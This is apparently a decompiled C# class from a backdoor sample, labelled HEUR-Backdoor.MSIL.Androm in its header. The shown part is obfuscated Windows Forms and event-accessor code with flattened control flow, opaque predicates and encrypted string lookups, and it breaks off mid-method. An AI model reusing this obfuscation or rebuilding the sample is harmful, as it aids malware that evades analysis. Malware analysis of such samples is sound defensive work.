// Decompiled with JetBrains decompiler
// Type: InvalidOleVariantTypeExcept.Connections.GetterStrategyConnector
// Assembly: InvalidOleVariantTypeExcept, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9E82E8E9-C8CD-41F7-BA61-2A9379AE4148
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.Androm.gen-02b77b24d467552510c0f56dbde53c82e4e932dcaeb0e08fcfec00d4c359a9b9.exe

using InvalidOleVariantTypeExcept.Filters;
using InvalidOleVariantTypeExcept.Messages;
using InvalidOleVariantTypeExcept.States;
using InvalidOleVariantTypeExcept.Watchers;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using TGL.Consumers;
using TGL.Containers;
using TGL.Licensing;
using TGL.Objects;
using TGL.Polices;
using TGL.Services;
using TGL.Shared;

namespace InvalidOleVariantTypeExcept.Connections
{
  public class GetterStrategyConnector : Form, PropertyAnnotationState, DicComparatorConsumer
  {
    private PoolFieldMessage m_Candidate;
    private List<PoolFieldMessage> m_Client;
    private GetterStrategyConnector.ObserverAnnotationState m_Request;
    protected bool helper;
    protected int m_Ref;
    private int _Utils;
    private GetterStrategyConnector.InfoComparatorConsumer config;
    private GetterStrategyConnector.InfoComparatorConsumer m_Repository;
    private object _Params;
    protected GroupBox m_Predicate;
    private IContainer _Tests;
    private StatusStrip m_Creator;
    private ToolStripStatusLabel _Getter;
    private GroupBox dic;
    private Button m_Service;
    private Button advisor;
    private TextBox _Printer;
    private Label _Parameter;
    private TextBox _Listener;
    private Label _Collection;
    private Label m_Instance;
    private Label _Policy;
    private Button _Connection;
    private TextBox m_Product;
    private Button m_Expression;
    private GroupBox order;
    private Button _Broadcaster;
    private DataGridView _Issuer;
    private GroupBox _Producer;
    private DataGridView m_Exception;
    private GroupBox _Manager;
    private GroupBox _Rules;
    private Button specification;
    private Label _Setter;
    private Label _Task;
    private GroupBox m_Initializer;
    private Button _Code;
    private RadioButton m_Composer;
    private RadioButton _Wrapper;
    private RadioButton m_Writer;
    private NumericUpDown global;
    private CheckBox watcher;
    private Label _Base;
    private DataGridView m_Mapper;
    private DataGridViewTextBoxColumn importer;
    private DataGridViewButtonColumn m_Test;
    private DataGridViewButtonColumn m_Proc;
    private DataGridViewTextBoxColumn recordComparator;
    private DataGridViewTextBoxColumn _ComparatorComparator;
    private DataGridViewTextBoxColumn _VisitorComparator;
    private DataGridViewTextBoxColumn _ResolverComparator;
    private DataGridViewTextBoxColumn _RegistryComparator;
    private DataGridViewTextBoxColumn _ContextComparator;
    private GroupBox stubComparator;
    private Button _PublisherComparator;
    private Button schemaComparator;
    private Label prototypeComparator;
    private TextBox m_ValueComparator;
    private RichTextBox regComparator;
    private System.Windows.Forms.Timer _FieldComparator;

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void StartComparator(SchemaPublisherService setup)
    {
      int num1 = 0;
      while (true)
      {
        int num2 = num1;
        SchemaPublisherService comparand;
        SchemaPublisherService publisherService1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_2;
            case 1:
            case 4:
              comparand = publisherService1;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 6;
                continue;
              }
              goto case 5;
            case 2:
            case 6:
              goto label_3;
            case 3:
              goto label_1;
            case 5:
              if (publisherService1 != comparand)
                goto case 1;
              else
                goto label_9;
            case 7:
              goto label_10;
            default:
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 3;
                continue;
              }
              goto case 1;
          }
        }
label_1:
        SchemaPublisherService publisherService2;
        // ISSUE: reference to a compiler-generated field
        publisherService1 = Interlocked.CompareExchange<SchemaPublisherService>(ref this._Invocation, publisherService2, comparand);
        num1 = 5;
        continue;
label_2:
        // ISSUE: reference to a compiler-generated field
        publisherService1 = this._Invocation;
        num1 = 4;
        continue;
label_3:
        publisherService2 = comparand + setup;
        goto label_1;
label_9:
        num1 = 7;
      }
label_10:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void PublishComparator(SchemaPublisherService task)
    {
      int num = 3;
      SchemaPublisherService comparand;
      SchemaPublisherService publisherService1;
      SchemaPublisherService publisherService2;
      while (true)
      {
        switch (num)
        {
          case 0:
            if (publisherService2 == comparand)
            {
              num = 7;
              continue;
            }
            goto case 1;
          case 1:
          case 4:
            comparand = publisherService2;
            num = 5;
            continue;
          case 2:
          case 5:
            publisherService1 = comparand - task;
            goto case 6;
          case 3:
            // ISSUE: reference to a compiler-generated field
            publisherService2 = this._Invocation;
            num = 4;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated field
            publisherService2 = Interlocked.CompareExchange<SchemaPublisherService>(ref this._Invocation, publisherService1, comparand);
            num = 0;
            continue;
          case 7:
            goto label_9;
          default:
            num = 6;
            continue;
        }
      }
label_9:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void VerifyComparator(Struct value)
    {
      int num = 6;
      if (GetterStrategyConnector.NewInfo())
        goto label_4;
label_1:
      Struct struct1;
      Struct comparand;
      // ISSUE: reference to a compiler-generated field
      Struct struct2 = Interlocked.CompareExchange<Struct>(ref this._Iterator, struct1, comparand);
      num = 3;
label_4:
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_1;
          case 1:
          case 5:
            comparand = struct2;
            num = 2;
            continue;
          case 2:
            goto label_3;
          case 3:
          case 4:
            if (struct2 == comparand)
            {
              if (GetterStrategyConnector.NewInfo())
              {
                num = 7;
                continue;
              }
              goto label_9;
            }
            else
              goto case 1;
          case 6:
            // ISSUE: reference to a compiler-generated field
            struct2 = this._Iterator;
            num = 5;
            continue;
          case 7:
            goto label_10;
          default:
            num = 0;
            continue;
        }
      }
label_3:
      struct1 = comparand + value;
      goto label_1;
label_10:
      return;
label_9:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void ExcludeComparator(Struct config)
    {
      int num1 = 1;
      while (true)
      {
        int num2 = num1;
        Struct struct1;
        Struct comparand;
        Struct struct2;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              goto label_1;
            case 2:
            case 4:
              struct2 = comparand - config;
              goto case 3;
            case 3:
              // ISSUE: reference to a compiler-generated field
              struct1 = Interlocked.CompareExchange<Struct>(ref this._Iterator, struct2, comparand);
              if (true)
              {
                num2 = 6;
                continue;
              }
              goto label_10;
            case 5:
              goto label_10;
            case 6:
              if (struct1 == comparand)
              {
                int num3 = 7;
                num2 = GetterStrategyConnector.StopInfo() ? num3 : num3;
                continue;
              }
              goto label_10;
            case 7:
              goto label_8;
            default:
              goto label_5;
          }
        }
label_1:
        // ISSUE: reference to a compiler-generated field
        struct1 = this._Iterator;
        num1 = 5;
        continue;
label_5:
        num1 = 3;
        continue;
label_10:
        comparand = struct1;
        num1 = 4;
      }
label_8:;
    }

    public event Singleton login
    {
      [MethodImpl(MethodImplOptions.NoInlining)] add
      {
        int num1 = 4;
        while (true)
        {
          int num2 = num1;
          Singleton singleton1;
          Singleton comparand;
          Singleton singleton2;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 4:
                goto label_6;
              case 1:
              case 6:
                goto label_9;
              case 2:
                singleton2 = Interlocked.CompareExchange<Singleton>(ref this.m_Message, singleton1, comparand);
                num2 = 3;
                continue;
              case 3:
                if (singleton2 == comparand)
                {
                  num2 = 7;
                  continue;
                }
                goto label_9;
              case 5:
                singleton1 = comparand + value;
                goto case 2;
              case 7:
                goto label_10;
              default:
                if (GetterStrategyConnector.NewInfo())
                {
                  num2 = 2;
                  continue;
                }
                goto label_6;
            }
          }
label_6:
          singleton2 = this.m_Message;
          num1 = 6;
          continue;
label_9:
          comparand = singleton2;
          num1 = 5;
        }
label_10:;
      }
      [MethodImpl(MethodImplOptions.NoInlining)] remove
      {
        int num1 = 1;
        if (!GetterStrategyConnector.StopInfo())
          goto label_3;
label_1:
        Singleton comparand;
        Singleton singleton1 = comparand - value;
        goto label_6;
label_2:
        int num2;
        num1 = num2;
label_3:
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_9;
            case 1:
              goto label_5;
            case 2:
            case 3:
              goto label_6;
            case 4:
            case 6:
              goto label_7;
            case 5:
              goto label_1;
            case 7:
              goto label_10;
            default:
              if (true)
              {
                num1 = 2;
                continue;
              }
              goto label_5;
          }
        }
label_10:
        return;
label_5:
        Singleton singleton2 = this.m_Message;
        num2 = 0;
        goto label_2;
label_6:
        singleton2 = Interlocked.CompareExchange<Singleton>(ref this.m_Message, singleton1, comparand);
        if (true)
        {
          num1 = 6;
          goto label_3;
        }
label_7:
        if (singleton2 == comparand)
        {
          num2 = 7;
          goto label_2;
        }
label_9:
        comparand = singleton2;
        num2 = 5;
        goto label_2;
      }
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void CloneComparator(AnnotationValueFilter param)
    {
      int num1 = 0;
      while (true)
      {
        int num2 = num1;
        AnnotationValueFilter annotationValueFilter1;
        AnnotationValueFilter annotationValueFilter2;
        AnnotationValueFilter comparand;
        while (true)
        {
          switch (num2)
          {
            case 0:
              // ISSUE: reference to a compiler-generated field
              annotationValueFilter1 = this.m_Tokenizer;
              if (true)
              {
                num2 = 1;
                continue;
              }
              goto case 3;
            case 1:
              goto label_3;
            case 2:
            case 4:
              if (annotationValueFilter1 == comparand)
              {
                if (!GetterStrategyConnector.StopInfo())
                {
                  num2 = 7;
                  continue;
                }
                goto label_10;
              }
              else
                goto label_3;
            case 3:
            case 5:
              // ISSUE: reference to a compiler-generated field
              annotationValueFilter1 = Interlocked.CompareExchange<AnnotationValueFilter>(ref this.m_Tokenizer, annotationValueFilter2, comparand);
              num2 = 2;
              continue;
            case 6:
              annotationValueFilter2 = comparand + param;
              goto case 3;
            case 7:
              goto label_12;
            default:
              goto label_7;
          }
        }
label_3:
        comparand = annotationValueFilter1;
        num1 = 6;
        continue;
label_7:
        num1 = 5;
      }
label_12:
      return;
label_10:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void CancelComparator(AnnotationValueFilter asset)
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        AnnotationValueFilter annotationValueFilter1;
        AnnotationValueFilter comparand;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_1;
            case 1:
            case 3:
              goto label_9;
            case 2:
              goto label_3;
            case 4:
            case 6:
              if (annotationValueFilter1 == comparand)
              {
                if (true)
                {
                  num2 = 7;
                  continue;
                }
                goto label_9;
              }
              else
                goto label_1;
            case 5:
              // ISSUE: reference to a compiler-generated field
              annotationValueFilter1 = this.m_Tokenizer;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 0;
                continue;
              }
              goto label_3;
            case 7:
              goto label_10;
            default:
              if (true)
              {
                num2 = 1;
                continue;
              }
              goto case 4;
          }
        }
label_1:
        comparand = annotationValueFilter1;
        num1 = 2;
        continue;
label_3:
        AnnotationValueFilter annotationValueFilter2 = comparand - asset;
label_9:
        // ISSUE: reference to a compiler-generated field
        annotationValueFilter1 = Interlocked.CompareExchange<AnnotationValueFilter>(ref this.m_Tokenizer, annotationValueFilter2, comparand);
        num1 = 6;
      }
label_10:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void LogoutComparator(InvocationSchemaObject ident)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        InvocationSchemaObject invocationSchemaObject1;
        InvocationSchemaObject comparand;
        InvocationSchemaObject invocationSchemaObject2;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              goto label_4;
            case 1:
            case 3:
              goto label_3;
            case 2:
              // ISSUE: reference to a compiler-generated field
              invocationSchemaObject1 = Interlocked.CompareExchange<InvocationSchemaObject>(ref this.m_Filter, invocationSchemaObject2, comparand);
              if (true)
              {
                num2 = 5;
                continue;
              }
              goto label_10;
            case 5:
              if (invocationSchemaObject1 == comparand)
              {
                if (true)
                {
                  num2 = 7;
                  continue;
                }
                goto label_3;
              }
              else
                goto label_3;
            case 6:
              invocationSchemaObject2 = comparand + ident;
              goto case 2;
            case 7:
              goto label_11;
            default:
              goto label_8;
          }
        }
label_3:
        comparand = invocationSchemaObject1;
        num1 = 6;
        continue;
label_4:
        // ISSUE: reference to a compiler-generated field
        invocationSchemaObject1 = this.m_Filter;
        num1 = 3;
        continue;
label_8:
        num1 = 2;
      }
label_11:
      return;
label_10:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void QueryComparator(InvocationSchemaObject info)
    {
      int num = 4;
      if (GetterStrategyConnector.StopInfo())
        ;
      InvocationSchemaObject invocationSchemaObject1;
      InvocationSchemaObject invocationSchemaObject2;
      InvocationSchemaObject comparand;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
            // ISSUE: reference to a compiler-generated field
            invocationSchemaObject1 = this.m_Filter;
            if (true)
            {
              num = 2;
              continue;
            }
            goto case 6;
          case 1:
          case 2:
            comparand = invocationSchemaObject1;
            num = 3;
            continue;
          case 3:
            invocationSchemaObject2 = comparand - info;
            goto case 6;
          case 5:
            if (invocationSchemaObject1 == comparand)
            {
              if (true)
              {
                num = 7;
                continue;
              }
              goto label_10;
            }
            else
              goto case 1;
          case 6:
            // ISSUE: reference to a compiler-generated field
            invocationSchemaObject1 = Interlocked.CompareExchange<InvocationSchemaObject>(ref this.m_Filter, invocationSchemaObject2, comparand);
            num = 5;
            continue;
          case 7:
            goto label_1;
          default:
            num = 6;
            continue;
        }
      }
label_1:
      return;
label_10:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InvokeComparator(FacadeStubPolicy spec)
    {
      int num = 6;
      FacadeStubPolicy facadeStubPolicy1;
      FacadeStubPolicy comparand;
      FacadeStubPolicy facadeStubPolicy2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            facadeStubPolicy2 = comparand + spec;
            goto case 3;
          case 1:
            comparand = facadeStubPolicy1;
            num = 0;
            continue;
          case 3:
          case 4:
            // ISSUE: reference to a compiler-generated field
            facadeStubPolicy1 = Interlocked.CompareExchange<FacadeStubPolicy>(ref this.account, facadeStubPolicy2, comparand);
            num = 5;
            continue;
          case 5:
            if (facadeStubPolicy1 == comparand)
            {
              num = 7;
              continue;
            }
            goto case 1;
          case 6:
            // ISSUE: reference to a compiler-generated field
            facadeStubPolicy1 = this.account;
            num = 1;
            continue;
          case 7:
            goto label_9;
          default:
            num = 4;
            continue;
        }
      }
label_9:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void ManageComparator(FacadeStubPolicy value)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        FacadeStubPolicy facadeStubPolicy1;
        FacadeStubPolicy comparand;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              // ISSUE: reference to a compiler-generated field
              facadeStubPolicy1 = this.account;
              if (true)
              {
                num2 = 2;
                continue;
              }
              goto label_3;
            case 1:
              if (facadeStubPolicy1 != comparand)
                goto case 2;
              else
                goto label_9;
            case 2:
              comparand = facadeStubPolicy1;
              if (true)
              {
                num2 = 6;
                continue;
              }
              goto case 0;
            case 3:
            case 5:
              goto label_7;
            case 6:
              goto label_3;
            case 7:
              goto label_11;
            default:
              num2 = 5;
              continue;
          }
        }
label_3:
        FacadeStubPolicy facadeStubPolicy2 = comparand - value;
label_7:
        // ISSUE: reference to a compiler-generated field
        facadeStubPolicy1 = Interlocked.CompareExchange<FacadeStubPolicy>(ref this.account, facadeStubPolicy2, comparand);
        num1 = 1;
        continue;
label_9:
        num1 = 7;
      }
label_11:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void ValidateComparator(Rule instance)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        Rule rule1;
        Rule comparand;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_2;
            case 1:
            case 6:
              comparand = rule1;
              if (true)
              {
                num2 = 2;
                continue;
              }
              goto case 4;
            case 2:
              goto label_3;
            case 3:
              goto label_1;
            case 4:
            case 5:
              if (rule1 != comparand)
                goto case 1;
              else
                goto label_9;
            case 7:
              goto label_10;
            default:
              num2 = 0;
              continue;
          }
        }
label_1:
        // ISSUE: reference to a compiler-generated field
        rule1 = this._System;
        num1 = 6;
        continue;
label_2:
        Rule rule2;
        // ISSUE: reference to a compiler-generated field
        rule1 = Interlocked.CompareExchange<Rule>(ref this._System, rule2, comparand);
        num1 = 5;
        continue;
label_3:
        rule2 = comparand + instance;
        goto label_2;
label_9:
        num1 = 7;
      }
label_10:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void RevertComparator(Rule spec)
    {
      int num1 = 6;
      while (true)
      {
        int num2 = num1;
        Rule rule1;
        Rule comparand;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_9;
            case 1:
            case 5:
              goto label_10;
            case 2:
            case 4:
              goto label_5;
            case 3:
              if (rule1 == comparand)
              {
                int num3 = 7;
                num2 = GetterStrategyConnector.StopInfo() ? num3 : num3;
                continue;
              }
              goto label_10;
            case 6:
              // ISSUE: reference to a compiler-generated field
              rule1 = this._System;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 5;
                continue;
              }
              goto case 3;
            case 7:
              goto label_4;
            default:
              if (!GetterStrategyConnector.StopInfo())
              {
                num2 = 0;
                continue;
              }
              goto label_9;
          }
        }
label_5:
        Rule rule2 = comparand - spec;
label_9:
        // ISSUE: reference to a compiler-generated field
        rule1 = Interlocked.CompareExchange<Rule>(ref this._System, rule2, comparand);
        num1 = 3;
        continue;
label_10:
        comparand = rule1;
        num1 = 4;
      }
label_4:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void SearchVisitor(Interpreter value)
    {
      int num = 6;
      Interpreter interpreter1;
      Interpreter comparand;
      Interpreter interpreter2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            comparand = interpreter1;
            num = 3;
            continue;
          case 2:
          case 3:
            interpreter2 = comparand + value;
            goto case 5;
          case 4:
            if (interpreter1 == comparand)
            {
              num = 7;
              continue;
            }
            goto case 0;
          case 5:
            // ISSUE: reference to a compiler-generated field
            interpreter1 = Interlocked.CompareExchange<Interpreter>(ref this._Method, interpreter2, comparand);
            num = 4;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated field
            interpreter1 = this._Method;
            num = 0;
            continue;
          case 7:
            goto label_9;
          default:
            num = 5;
            continue;
        }
      }
label_9:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void ReflectVisitor(Interpreter last)
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        Interpreter interpreter1;
        Interpreter comparand;
        Interpreter interpreter2;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              comparand = interpreter1;
              num2 = 3;
              continue;
            case 2:
              // ISSUE: reference to a compiler-generated field
              interpreter1 = Interlocked.CompareExchange<Interpreter>(ref this._Method, interpreter2, comparand);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 6;
                continue;
              }
              goto case 4;
            case 3:
              interpreter2 = comparand - last;
              goto case 2;
            case 4:
            case 6:
              if (interpreter1 == comparand)
              {
                if (true)
                {
                  num2 = 7;
                  continue;
                }
                goto label_5;
              }
              else
                goto case 0;
            case 5:
              goto label_5;
            case 7:
              goto label_10;
            default:
              int num3 = 2;
              num2 = GetterStrategyConnector.StopInfo() ? num3 : num3;
              continue;
          }
        }
label_5:
        // ISSUE: reference to a compiler-generated field
        interpreter1 = this._Method;
        num1 = 0;
      }
label_10:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void MoveVisitor(Thread spec)
    {
      int num1 = 1;
      while (true)
      {
        int num2 = num1;
        Thread thread1;
        Thread comparand;
        Thread thread2;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              // ISSUE: reference to a compiler-generated field
              thread1 = this.customer;
              if (true)
              {
                num2 = 4;
                continue;
              }
              goto case 2;
            case 2:
            case 5:
              thread2 = comparand + spec;
              goto case 3;
            case 3:
              // ISSUE: reference to a compiler-generated field
              thread1 = Interlocked.CompareExchange<Thread>(ref this.customer, thread2, comparand);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 6;
                continue;
              }
              goto case 6;
            case 4:
              goto label_1;
            case 6:
              if (thread1 == comparand)
              {
                num2 = 7;
                continue;
              }
              goto label_1;
            case 7:
              goto label_11;
            default:
              goto label_9;
          }
        }
label_1:
        comparand = thread1;
        num1 = 5;
        continue;
label_9:
        num1 = 3;
      }
label_11:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void CollectVisitor(Thread param)
    {
      int num1 = 4;
      if (true)
        goto label_9;
label_1:
      // ISSUE: reference to a compiler-generated field
      Thread thread1 = this.customer;
      int num2 = 1;
label_8:
      num1 = num2;
label_9:
      Thread comparand;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            goto label_1;
          case 1:
            comparand = thread1;
            int num3 = 5;
            num1 = GetterStrategyConnector.StopInfo() ? num3 : num3;
            continue;
          case 2:
            if (thread1 != comparand)
              goto case 1;
            else
              goto label_6;
          case 3:
          case 6:
            goto label_4;
          case 5:
            goto label_7;
          case 7:
            goto label_3;
          default:
            goto label_10;
        }
      }
label_4:
      Thread thread2;
      // ISSUE: reference to a compiler-generated field
      thread1 = Interlocked.CompareExchange<Thread>(ref this.customer, thread2, comparand);
      num2 = 2;
      goto label_8;
label_6:
      num2 = 7;
      goto label_8;
label_7:
      thread2 = comparand - param;
      goto label_4;
label_3:
      return;
label_10:
      num2 = 6;
      goto label_8;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void ChangeVisitor(AuthenticationValueFilter asset)
    {
      int num1 = 0;
      if (GetterStrategyConnector.NewInfo())
        goto label_7;
label_1:
      AuthenticationValueFilter authenticationValueFilter1;
      AuthenticationValueFilter comparand;
      int num2;
      if (authenticationValueFilter1 == comparand)
      {
        num2 = 7;
        goto label_6;
      }
label_4:
      comparand = authenticationValueFilter1;
      num2 = 6;
label_6:
      num1 = num2;
label_7:
      AuthenticationValueFilter authenticationValueFilter2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_3;
          case 1:
          case 4:
            goto label_1;
          case 2:
          case 3:
            // ISSUE: reference to a compiler-generated field
            authenticationValueFilter1 = Interlocked.CompareExchange<AuthenticationValueFilter>(ref this._Page, authenticationValueFilter2, comparand);
            if (true)
            {
              num1 = 1;
              continue;
            }
            goto label_11;
          case 5:
            goto label_4;
          case 6:
            authenticationValueFilter2 = comparand + asset;
            goto case 2;
          case 7:
            goto label_9;
          default:
            int num3 = 2;
            num1 = GetterStrategyConnector.StopInfo() ? num3 : num3;
            continue;
        }
      }
label_3:
      // ISSUE: reference to a compiler-generated field
      authenticationValueFilter1 = this._Page;
      num2 = 5;
      goto label_6;
label_9:
      return;
label_11:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void FlushVisitor(AuthenticationValueFilter asset)
    {
      int num1 = 3;
      if (true)
        goto label_5;
label_1:
      AuthenticationValueFilter authenticationValueFilter1;
      AuthenticationValueFilter comparand;
      int num2;
      if (authenticationValueFilter1 == comparand)
        num2 = 7;
      else
        goto label_7;
label_4:
      num1 = num2;
label_5:
      AuthenticationValueFilter authenticationValueFilter2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_7;
          case 1:
            // ISSUE: reference to a compiler-generated field
            authenticationValueFilter1 = Interlocked.CompareExchange<AuthenticationValueFilter>(ref this._Page, authenticationValueFilter2, comparand);
            num1 = 6;
            continue;
          case 2:
          case 5:
            authenticationValueFilter2 = comparand - asset;
            goto case 1;
          case 3:
            // ISSUE: reference to a compiler-generated field
            authenticationValueFilter1 = this._Page;
            num1 = 0;
            continue;
          case 4:
          case 6:
            goto label_1;
          case 7:
            goto label_10;
          default:
            goto label_6;
        }
      }
label_10:
      return;
label_6:
      num2 = 1;
      goto label_4;
label_7:
      comparand = authenticationValueFilter1;
      num2 = 5;
      goto label_4;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public GetterStrategyConnector()
    {
      int num1 = 13;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              goto label_10;
            case 2:
              this.m_Predicate.Size = new Size(403, 331);
              this.m_Predicate.FlatStyle = FlatStyle.Standard;
              goto case 12;
            case 3:
              goto label_8;
            case 4:
              this.GetComparator();
              if (true)
              {
                num2 = 14;
                continue;
              }
              goto label_18;
            case 5:
              this.PostComparator();
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 11;
                continue;
              }
              goto case 2;
            case 6:
              this.m_Ref = 1000;
              int num3 = 9;
              num2 = GetterStrategyConnector.StopInfo() ? num3 : num3;
              continue;
            case 7:
            case 10:
              goto label_5;
            case 8:
              // ISSUE: explicit constructor call
              base.\u002Ector();
              if (true)
              {
                num2 = 5;
                continue;
              }
              goto label_10;
            case 9:
              goto label_7;
            case 11:
              goto label_6;
            case 12:
              this.order.Controls.Add((Control) this.m_Predicate);
              num2 = 4;
              continue;
            case 13:
              UtilsContextLicense.ListWorker();
              num2 = 0;
              continue;
            case 14:
              this.m_Client = new List<PoolFieldMessage>();
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 7;
                continue;
              }
              goto case 5;
            case 15:
              goto label_3;
            default:
              num2 = 12;
              continue;
          }
        }
label_5:
        this.helper = false;
        num1 = 6;
        continue;
label_6:
        this.m_Predicate = new GroupBox();
        this.m_Predicate.Location = new Point(7, 13);
        num1 = 2;
        continue;
label_7:
        this._Utils = 0;
        num1 = 15;
        continue;
label_8:
        this._Tests = (IContainer) null;
        num1 = 8;
        continue;
label_10:
        this._Params = new object();
        num1 = 3;
      }
label_3:
      return;
label_18:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool CalcComparator(string info)
    {
      int num1 = 4;
      bool flag1;
      while (true)
      {
        int num2 = num1;
        IEnumerator enumerator;
        bool flag2;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
            case 7:
              goto label_23;
            case 1:
            case 2:
              goto label_18;
            case 4:
              flag2 = this._Setter.Text.Equals(info);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 5;
                continue;
              }
              goto label_18;
            case 5:
              if (!flag2)
              {
                enumerator = ((IEnumerable) this.m_Mapper.Rows).GetEnumerator();
                if (true)
                {
                  num2 = 6;
                  continue;
                }
                goto label_23;
              }
              else
                goto label_16;
            case 6:
              goto label_1;
            default:
              if (true)
              {
                num2 = 0;
                continue;
              }
              goto label_23;
          }
        }
label_1:
        try
        {
          while (enumerator.MoveNext())
          {
            DataGridViewRow current = (DataGridViewRow) enumerator.Current;
            int num3 = 0;
            if (true)
              goto label_5;
label_3:
            bool flag3;
            if (!flag3)
              continue;
            goto label_8;
label_4:
            int num4;
            num3 = num4;
label_5:
            while (true)
            {
              switch (num3)
              {
                case 0:
                  goto label_7;
                case 1:
                case 4:
                  goto label_3;
                case 2:
                case 3:
                  goto label_8;
                case 5:
                  goto label_23;
                default:
                  num3 = 3;
                  continue;
              }
            }
label_7:
            flag3 = current.Cells[0].Value.Equals((object) info);
            num4 = 4;
            goto label_4;
label_8:
            flag1 = true;
            num4 = 5;
            goto label_4;
          }
        }
        finally
        {
          if (enumerator is IDisposable disposable)
            disposable.Dispose();
        }
        flag1 = false;
        num1 = 7;
        continue;
label_16:
        num1 = 1;
      }
label_18:
      flag1 = true;
label_23:
      return flag1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void deconnectionHandler() => this.Invoke((Delegate) (() => this.GetComparator()));

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void GetComparator()
    {
      int num1 = 13;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_17;
            case 1:
              goto label_23;
            case 2:
              this._Broadcaster.Visible = false;
              this._Code.Enabled = true;
              int num3 = 10;
              num2 = GetterStrategyConnector.StopInfo() ? num3 : num3;
              continue;
            case 3:
              goto label_12;
            case 4:
              this._Base.Text = "";
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 5;
                continue;
              }
              goto label_2;
            case 5:
            case 17:
              goto label_7;
            case 6:
              this.stubComparator.Visible = false;
              this.m_Expression.Enabled = true;
              goto case 20;
            case 7:
              this._Getter.Text = this.m_Candidate?.ToString() + RoleValueFilter.RestartVisitor(2634) + this.config.ToString();
              if (!GetterStrategyConnector.StopInfo())
              {
                num2 = 21;
                continue;
              }
              goto label_26;
            case 8:
            case 11:
              goto label_6;
            case 9:
              goto label_4;
            case 10:
              goto label_2;
            case 12:
              goto label_11;
            case 13:
              goto label_24;
            case 14:
              this.m_Service.Enabled = false;
              int num4 = 12;
              num2 = GetterStrategyConnector.StopInfo() ? num4 : num4;
              continue;
            case 15:
              this.reset();
              int num5 = 1;
              num2 = GetterStrategyConnector.StopInfo() ? num5 : num5;
              continue;
            case 16:
              goto label_14;
            case 18:
              goto label_9;
